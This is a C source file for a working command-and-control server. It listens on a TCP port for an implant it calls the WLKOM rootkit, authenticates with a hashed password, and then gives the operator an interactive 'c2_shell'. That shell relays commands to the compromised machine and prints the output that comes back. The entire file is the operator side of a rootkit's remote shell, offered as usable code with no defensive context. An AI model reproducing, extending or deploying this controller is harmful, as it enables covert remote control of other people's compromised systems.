#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <termios.h>
#include <unistd.h>

#define BUF_SIZE     256
#define FNV1A_OFFSET 2166136261U
#define FNV1A_PRIME  16777619U

static void timestamp(void)
{
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    char buf[32];
    strftime(buf, sizeof(buf), "%H:%M:%S", tm);
    printf("[%s] ", buf);
}

static uint32_t fnv1a_hash(const char *str)
{
    uint32_t hash = FNV1A_OFFSET;

    while (*str) {
        hash ^= (unsigned char)*str;
        hash *= FNV1A_PRIME;
        str++;
    }

    return hash;
}

static int write_all(int fd, const char *buf, size_t len)
{
    while (len > 0) {
        ssize_t written = write(fd, buf, len);

        if (written <= 0)
            return -1;

        buf += written;
        len -= written;
    }

    return 0;
}

static int read_line(int fd, char *buf, size_t size)
{
    size_t pos = 0;

    while (pos + 1 < size) {
        ssize_t n = read(fd, &buf[pos], 1);

        if (n <= 0)
            return -1;

        if (buf[pos] == '\n') {
            buf[pos] = '\0';
            if (pos > 0 && buf[pos - 1] == '\r')
                buf[pos - 1] = '\0';
            return 0;
        }

        pos++;
    }

    buf[pos] = '\0';
    return -1;
}

static int wait_for_command_or_disconnect(int client_fd)
{
    while (1) {
        fd_set readfds;
        int max_fd = client_fd > STDIN_FILENO ? client_fd : STDIN_FILENO;
        int ret;

        FD_ZERO(&readfds);
        FD_SET(STDIN_FILENO, &readfds);
        FD_SET(client_fd, &readfds);

        ret = select(max_fd + 1, &readfds, NULL, NULL, NULL);
        if (ret < 0)
            return -1;

        if (FD_ISSET(client_fd, &readfds)) {
            char probe;
            ssize_t n = recv(client_fd, &probe, 1, MSG_PEEK);

            if (n <= 0)
                return 0;
        }

        if (FD_ISSET(STDIN_FILENO, &readfds))
            return 1;
    }
}

static int read_password(char *buf, size_t size)
{
    struct termios old_term, new_term;
    int hide_input = isatty(STDIN_FILENO) &&
        tcgetattr(STDIN_FILENO, &old_term) == 0;

    printf("WLKOM password: ");
    fflush(stdout);

    if (hide_input) {
        new_term = old_term;
        new_term.c_lflag &= ~ECHO;
        tcsetattr(STDIN_FILENO, TCSAFLUSH, &new_term);
    }

    if (fgets(buf, size, stdin) == NULL) {
        if (hide_input) {
            tcsetattr(STDIN_FILENO, TCSAFLUSH, &old_term);
            printf("\n");
        }
        return -1;
    }

    if (hide_input) {
        tcsetattr(STDIN_FILENO, TCSAFLUSH, &old_term);
        printf("\n");
    }

    buf[strcspn(buf, "\r\n")] = '\0';
    return buf[0] == '\0' ? -1 : 0;
}

int main(int argc, char **argv)
{
    int port;
    char password[BUF_SIZE];
    int server_fd, client_fd;
    struct sockaddr_in server_addr = { 0 }, client_addr = { 0 };
    socklen_t client_len = sizeof(client_addr);
    char buf[BUF_SIZE];
    char auth_msg[BUF_SIZE];
    char auth_reply[BUF_SIZE];
    int opt = 1;

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        return 1;
    }

    port = atoi(argv[1]);
    if (port <= 0) {
        fprintf(stderr, "Invalid port\n");
        return 1;
    }

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }

    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family      = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port        = htons(port);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        return 1;
    }

    if (listen(server_fd, 1) < 0) {
        perror("listen");
        return 1;
    }

    printf("C2 listening on port %d\n", port);

    while (1) {
        timestamp();
        printf("[?] Waiting for rootkit connection...\n");
        fflush(stdout);

        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }

        timestamp();
        printf("[+] Rootkit connected from %s\n", inet_ntoa(client_addr.sin_addr));
        fflush(stdout);

        if (read_password(password, sizeof(password)) < 0) {
            timestamp();
            printf("[-] Empty password or input closed\n");
            fflush(stdout);
            close(client_fd);
            continue;
        }

        snprintf(auth_msg, sizeof(auth_msg), "AUTH %08x\n", fnv1a_hash(password));
        if (write_all(client_fd, auth_msg, strlen(auth_msg)) < 0) {
            perror("write AUTH");
            close(client_fd);
            continue;
        }

        timestamp();
        printf("[+] AUTH sent\n");
        fflush(stdout);

        if (read_line(client_fd, auth_reply, sizeof(auth_reply)) < 0 ||
            strcmp(auth_reply, "AUTH_OK") != 0) {
            timestamp();
            printf("[-] Authentication failed: invalid password or connection lost\n");
            fflush(stdout);
            close(client_fd);
            continue;
        }

        timestamp();
        printf("[+] Authentication accepted\n");
        fflush(stdout);

        printf("\n=== WLKOM INTERACTIVE SHELL ===\n");
        printf("Type your command and press Enter. Type 'exit' to quit.\n\n");

        while (1) {
            int ready;
            int connection_lost = 0;

            printf("c2_shell> ");
            fflush(stdout);

            ready = wait_for_command_or_disconnect(client_fd);
            if (ready <= 0) {
                if (ready == 0)
                    printf("\n[!] Connection lost or rootkit disconnected.\n");
                break;
            }

            /* 1. Read command from operator terminal */
            if (fgets(buf, sizeof(buf), stdin) == NULL) {
                break;
            }

            if (strncmp(buf, "exit", 4) == 0) {
                printf("Exiting interactive shell...\n");
                break;
            }

            if (buf[0] == '\n') {
                continue;
            }

            /* 2. Forward the command payload to the rootkit module */
            if (write_all(client_fd, buf, strlen(buf)) < 0) {
                printf("\n[!] Connection lost or rootkit disconnected.\n");
                break;
            }

            /* 3. Read stream until the specific end of output marker is detected */
            while (1) {
                ssize_t n;

                memset(buf, 0, sizeof(buf));
                n = read(client_fd, buf, sizeof(buf) - 1);
                if (n <= 0) {
                    printf("\n[!] Connection lost or rootkit disconnected.\n");
                    connection_lost = 1;
                    break;
                }

                buf[n] = '\0';
                printf("%s", buf);
                fflush(stdout);

                /* Synchronize loop and break when the transmission block ends */
                if (strstr(buf, "--- End of Output ---\n\n") != NULL) {
                    break;
                }
            }

            if (connection_lost)
                break;
        }

        timestamp();
        printf("[-] Rootkit disconnected\n");
        fflush(stdout);

        close(client_fd);
    }

    close(server_fd);
    return 0;
}